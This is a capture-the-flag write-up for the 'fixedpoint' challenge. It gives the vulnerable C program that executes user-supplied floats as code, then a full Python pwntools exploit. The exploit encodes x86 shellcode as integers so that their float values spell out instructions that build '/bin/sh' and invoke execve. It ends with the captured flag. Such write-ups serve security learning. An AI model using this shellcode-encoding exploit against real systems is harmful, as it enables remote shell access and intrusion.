## Challenge Description
IEEE754 is useful when your values go from -inf to +inf, but really, fixed point is all you need. 
But if you want, you could grab this too. 
Running at fixedpoint.pwning.xxx:7777

## Challenge Code
```C
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>

int main(int argc, char** argv) {
  float* array = mmap(0, sizeof(float)*8192, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  int i;
  int temp;
  float ftemp;

  for (i = 0; i < 8192; i++) {
    if (!scanf("%d", &temp)) break;
    array[i] = ((float)temp)/1337.0;
  }

  write(1, "here we go\n", 11);
  (*(void(*)())array)();
}
```

## Solution
It's easy to see that we need to find numbers that their IEEE754 representation divided by 1337 produces valid shellcode. 
For those not familiar with IEEE754, it's basically a standard to represent float point numbers in computers.

In this chall I perceived that I could only control reliably the inner bytes of a 4byte value, so I needed to construct 
2 bytes shellcode and 2 bytes NOP, in this format 0xNSSN (where N is nop and S is part of real shellcode). 

```python
import struct
import pwnlib
import time


def get_int(s):
  a = struct.unpack('<f', s)[0]* 1337
  return struct.unpack('I', struct.pack('<I', a))[0]


target = pwnlib.tubes.remote.remote('fixedpoint.pwning.xxx', 7777, ssl=False)

print "Sending IEEE754 shellcode..."
time.sleep(1)

for i in range(3):
  target.sendline(str(get_int('\x00\x00\x00\x00')))

target.sendline(str(get_int('\x99\x89\xc3\x47')))     # mov ebx, eax
target.sendline(str(get_int('\x41\x44\x44\x44')))     # nop/align

for c in '/bin/sh\x00':
  target.sendline(str(get_int('\x99\xb0'+c+'\x47')))  # mov al, c
  target.sendline(str(get_int('\x57\x89\x03\x43')))   # mov [ebx], eax; inc ebx
  
for i in range(8):
  target.sendline(str(get_int('\x57\x4b\x41\x47')))   # dec ebx
  
target.sendline(str(get_int('\x99\x31\xc0\x47')))     # xor eax, eax
target.sendline(str(get_int('\x99\x31\xc9\x47')))     # xor ecx, ecx
target.sendline(str(get_int('\x99\x31\xd2\x47')))     # xor edx, edx
target.sendline(str(get_int('\x99\xb0\x0b\x47')))     # mov al, 0xb
target.sendline(str(get_int('\x99\xcd\x80\x47')))     # int 0x80

target.sendline('c')
target.interactive()
```

**PCTF{why_isnt_IEEE_754_IEEE_7.54e2}**


